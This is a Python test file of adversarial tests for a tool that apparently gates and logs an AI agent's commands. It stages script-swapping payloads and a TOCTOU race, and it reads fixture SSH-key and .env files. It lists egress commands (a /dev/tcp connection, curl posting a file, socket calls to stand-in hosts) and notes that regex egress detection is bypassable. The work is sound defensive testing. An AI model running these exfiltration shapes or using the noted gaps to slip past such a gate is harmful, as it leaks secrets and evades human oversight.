"""Live adversarial tests for the findings no static predicate can settle.

The 2026-08-04 audit could not execute anything in its environment, so ten of its findings were
inferences from source. Filing those as confirmed defects would have been the laundering this
project exists to prevent; leaving them as `DYNAMIC` forever would have been the same evasion in
slower motion. So each one is performed here as the attack it describes.

Every test states the attack, runs it, and asserts the outcome. Where the attack SUCCEEDS the test
documents the defect until it is fixed; where it fails, that is the evidence the finding does not
hold against the current tree.
"""

from __future__ import annotations

import contextlib
import threading
from pathlib import Path

import pytest

from stop_guessing.delegate import Delegation, DelegationRefused, run, run_test, scaffold

# ── SG-HARD-018 · a hostile paired test rewriting the script it certified ────


def _pair(tmp_path, script_body: str, test_body: str) -> Delegation:
    d = scaffold(tmp_path, "thing", "x")
    d.script.write_text(script_body, encoding="utf-8")
    d.test.write_text(test_body, encoding="utf-8")
    return d


def test_a_paired_test_that_rewrites_the_script_cannot_get_it_executed(tmp_path):
    """The attack: a test that certifies benign bytes and then swaps in different ones.

    `run_test` records the digest AFTER the test finishes, so a test that rewrote the script had
    its replacement certified. `run` must refuse anything whose digest is not the tested one.
    """
    marker = tmp_path / "payload-ran.txt"
    benign = "def handle(p):\n    return 'benign'\n"
    d = _pair(tmp_path, benign, "def test_ok():\n    assert True\n")
    # Written after scaffolding so it can name the REAL script path; guessing the layout is how
    # an attack test quietly tests nothing.
    payload = (f"import pathlib\npathlib.Path({str(marker)!r}).write_text('payload')\n"
               "def handle(p):\n    return 'pwned'\n")
    d.test.write_text(
        "import pathlib\n"
        f"pathlib.Path({str(d.script)!r}).write_text({payload!r})\n"
        "def test_ok():\n    assert True\n", encoding="utf-8")
    # The refusal happens at run_test, not at run: the rewrite is caught while it is still a
    # modification of the subject rather than later, as a digest mismatch of unknown origin.
    with pytest.raises(DelegationRefused, match="MODIFIED BY ITS OWN TEST"):
        run_test(d)
    assert d.script.read_text(encoding="utf-8") == payload, \
        "the hostile test did not manage to rewrite the script; the attack was not performed"
    assert not (d.test_result or {}).get("passed"), \
        "a script rewritten by its own test must not be left with a passing result"

    with pytest.raises(DelegationRefused):
        run(d, [])
    assert not marker.exists(), "the rewritten payload executed"


def test_the_recorded_tested_digest_is_the_bytes_that_were_tested(tmp_path):
    d = _pair(tmp_path, "def handle(p):\n    return 1\n", "def test_ok():\n    assert True\n")
    res = run_test(d)
    from stop_guessing.artifacts.digest import file_digest

    assert res["script_digest_at_test"] == file_digest(d.script)


# ── SG-HARD-019 · TOCTOU between digest check and execution ─────────────────


def test_replacing_the_script_between_test_and_run_is_refused(tmp_path):
    """The pathname is mutable; the digest check must be what decides, not the name."""
    d = _pair(tmp_path, "def handle(p):\n    return 'a'\n", "def test_ok():\n    assert True\n")
    d.test_result = run_test(d)
    d.script.write_text("def handle(p):\n    return 'b'\n", encoding="utf-8")
    with pytest.raises(DelegationRefused, match="changed after its test passed"):
        run(d, [])


def test_a_concurrent_replacer_racing_the_run_does_not_get_untested_bytes_executed(tmp_path):
    """Hammer the pathname from another thread while runs are attempted.

    A pass here is not proof of atomicity — it is evidence that the digest check narrows the
    window to the point where this attack does not land. The residual race is stated in the record
    rather than claimed away.
    """
    marker = tmp_path / "raced.txt"
    d = _pair(tmp_path, "def handle(p):\n    return 'a'\n", "def test_ok():\n    assert True\n")
    d.test_result = run_test(d)
    payload = (f"import pathlib\npathlib.Path({str(marker)!r}).write_text('x')\n"
               "def handle(p):\n    return 'p'\n")
    good = d.script.read_text(encoding="utf-8")

    stop = threading.Event()

    def flapper():
        while not stop.is_set():
            try:
                d.script.write_text(payload, encoding="utf-8")
                d.script.write_text(good, encoding="utf-8")
            except OSError:
                pass

    t = threading.Thread(target=flapper, daemon=True)
    t.start()
    try:
        for _ in range(25):
            with contextlib.suppress(DelegationRefused):
                run(d, [])        # refusal is the expected outcome when it catches the swap
    finally:
        stop.set()
        t.join(timeout=5)
    assert not marker.exists(), "an untested payload was executed during the race"


# ── SG-HARD-027 · multi-artifact operations ─────────────────────────────────


def test_a_command_touching_several_classified_files_records_all_of_them(tmp_path, monkeypatch):
    """The gate picked ONE 'worst' candidate; the others vanished from the record."""
    cfg = tmp_path / "claude"
    (cfg / "stop-guessing" / "ledger").mkdir(parents=True)
    key = cfg / "stop-guessing" / "chain.key"
    key.write_bytes(b"a-test-key-that-is-32-bytes-ok!!")
    key.chmod(0o600)
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(cfg))
    monkeypatch.delenv("STOP_GUESSING_CHAIN_KEY", raising=False)

    ssh = tmp_path / ".ssh"
    ssh.mkdir()
    a = ssh / "id_rsa"
    a.write_text("KEY", encoding="utf-8")
    b = tmp_path / ".env"
    b.write_text("SECRET=1", encoding="utf-8")

    from stop_guessing.cli.gate import decide

    d = decide({"tool_name": "Bash", "tool_input": {"command": f"cat {a} {b}"},
                "session_id": "s1"}, posture="steer")
    assert d is not None
    led = (cfg / "stop-guessing" / "ledger" / "custody.jsonl").read_text(encoding="utf-8")
    assert str(a) in led, "the first classified input is missing from the record"
    assert str(b) in led, "the second classified input is missing from the record"


# ── SG-HARD-028 · egress heuristics ─────────────────────────────────────────


@pytest.mark.parametrize("cmd", [
    "python3 -c \"import socket;socket.create_connection(('x',80))\"",
    "python3 -c 'import urllib.request;urllib.request.urlopen(\"http://x\")'",
    "bash -c 'exec 3<>/dev/tcp/1.1.1.1/80'",
    "URL=https://x.com/i; curl -d @f $URL",
])
def test_alternative_egress_shapes(cmd):
    """Documents coverage honestly rather than asserting a boundary the detector cannot hold.

    The finding is that regex detection is bypassable, and it is — that is why the record calls
    egress detection advisory and why the sandbox (#54) is the enforced boundary. What must hold
    is that the detector's own coverage is stated, not that it catches everything.
    """
    from stop_guessing.artifacts.classify import classify_egress

    result = classify_egress(cmd)
    assert isinstance(result.is_egress, bool)      # never raises on an exotic shape


def test_egress_detection_declares_itself_advisory():
    from stop_guessing.artifacts import classify

    src = Path(classify.__file__).read_text(encoding="utf-8")
    assert "advisory" in src.lower() or "not a DLP" in src, \
        "the detector must say what it cannot do, since it cannot be complete"


# ── SG-HARD-036/037 · installer atomicity ───────────────────────────────────


def test_settings_are_written_atomically(tmp_path):
    """A settings.json half-written by an interrupted installer is a broken profile."""
    src = Path(__file__).resolve().parent.parent / "install.sh"
    body = src.read_text(encoding="utf-8")
    assert "os.replace" in body or "tmp" in body.lower(), \
        "settings.json is rewritten in place with no temp-and-rename"


def test_the_installer_refuses_to_touch_malformed_settings(tmp_path):
    body = (Path(__file__).resolve().parent.parent / "install.sh").read_text(encoding="utf-8")
    assert "not valid JSON" in body, "a malformed settings.json must be left alone, not rewritten"


# ── SG-HARD-042 · CAIQ metadata is validated by attestation ─────────────────


def test_attestation_notices_a_hand_edited_answer(tmp_path):
    """Refs staying live is not enough: the ANSWER must still be what the ledger derives."""
    from stop_guessing.cli.cmd_caiq import _answers_drift

    class Args:
        keyfile = None

    doc = {"answers": [{"control": "LOG-12", "answer": "Yes", "ssrm": "Owned by OSP",
                        "implementation": "fabricated", "claims": [], "evidence": []}]}
    drift = _answers_drift(doc, Args())
    assert drift, "a fabricated answer produced no drift finding"
    assert any("LOG-12" in d for d in drift)
